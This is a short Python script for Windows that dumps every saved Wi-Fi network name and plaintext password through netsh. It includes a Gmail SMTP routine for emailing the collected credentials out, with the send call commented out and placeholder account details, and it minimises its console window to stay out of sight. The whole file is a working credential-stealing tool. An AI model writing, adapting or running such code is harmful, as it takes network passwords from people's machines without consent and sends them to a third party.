import smtplib, subprocess,re,ctypes

def send_mail(email, passwd, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, passwd)
    server.sendmail(email, email, message)
    server.quit()

def Remove(duplicate):
    final_list = []
    for num in duplicate:
        if num not in final_list:
            final_list.append(num)
    return final_list

network=subprocess.check_output("netsh wlan show profile", shell=True)
ans=network.decode("utf-8")
network_list = re.findall("(?:Profile\s*:\s)(.*)",ans)
unique_list = Remove(network_list)
result = []
a = "\""
for network in unique_list:
    try:
     current_result = subprocess.check_output("netsh wlan show profile " +a +  network +a + " key=clear", shell=True)
    except Exception:
        continue
    ans=current_result.decode("utf-8")
    key= re.findall("(?:Key\sContent\s*:\s)(.*)",ans)
    name= re.findall("(?:SSID\sname\s*:\s)(.*)",ans)
    result=result + name + key
#send_mail("Your Email", "Your app password", str(result))
ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 6 )